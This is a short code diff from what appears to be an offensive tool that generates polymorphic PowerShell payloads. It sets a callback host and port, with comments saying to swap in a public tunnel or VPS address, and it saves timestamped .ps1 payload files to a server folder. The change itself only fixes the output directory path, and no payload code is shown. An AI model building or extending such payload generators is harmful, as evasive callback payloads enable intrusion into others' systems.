@@ -12,7 +12,7 @@ def generate_polymorphic_ps():
     host = "localhost"  # Replace with your public tunnel or VPS IP
     port = 1443                      # Replace with your forwarded/tunnel port
 
-    folder = os.path.join("server", "payloads")
+    folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
     os.makedirs(folder, exist_ok=True)
 
     filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
